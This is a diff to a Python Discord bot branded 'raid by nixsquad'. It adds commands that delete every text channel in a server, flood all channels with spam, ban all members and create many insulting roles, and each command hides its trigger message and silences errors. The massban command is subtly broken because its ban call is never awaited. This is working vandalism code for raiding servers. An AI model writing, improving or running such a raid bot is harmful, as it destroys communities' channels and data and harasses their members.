@@ -13,8 +13,8 @@ Nix = commands.Bot(
     intents=discord.Intents.all()
 )
 
-exclude = ["1139432468655656960"]
-token = "BOT TOKEN"
+exclude = ["GUILDS EXCLUIDAS"]
+token = "AJSJKAJKSAKJJKASJKASFJKARIU34U32I43Q4JQKKJDADKASLDSAKLD"
 
 config_bot = {
     'channel_names': "raid by nixsquad",
@@ -42,6 +42,67 @@ async def on_connect():
     )
     await Nix.change_presence(activity=stream)    
     print(f"{Fore.GREEN}Bot logged in {Fore.RED}{Nix.user.display_name}{Fore.BLUE}({Nix.user.id})") 
+
+@Nix.command()
+async def nuke(ctx):
+    await ctx.message.delete()
+    if ctx.guild.id in exclude:
+        return
+    else:
+        try:
+            tasks = []
+            for channel in ctx.guild.channels:
+                if isinstance(channel, discord.TextChannel):
+                    task = create_task(channel.delete())
+                    tasks.append(task)
+
+            await gather(*tasks)
+        except:
+            pass
+
+@Nix.command()
+async def spam(ctx):
+    await ctx.message.delete()
+    if ctx.guild.id in exclude:
+        return
+    else:
+        try:
+            tasks = []
+            for _ in range(5):
+                for x in range(15):
+                    for channel in ctx.guild.channels:
+                        if isinstance(channel, discord.TextChannel):
+                            task = create_task(channel.send(config_bot['spam']))
+                            tasks.append(task)
+
+            await gather(*tasks)
+
+        except:
+            pass
+
+@Nix.command()
+async def massban(ctx):
+    await ctx.message.delete()
+    if ctx.guild.id in exclude:
+        return
+    else:
+        for member in ctx.guild.members:
+            try:
+                member.ban()
+            except:
+                pass
+
+@Nix.command()
+async def createroles(ctx):
+    await ctx.message.delete()
+    if ctx.guild.id in exclude:
+        return
+    else:
+        for _ in range(20):
+            try:
+                await ctx.guild.create_role(name="tuputamadre-role-raid-xddd")
+            except:
+                pass
 
 @Nix.command()
 async def on(ctx):
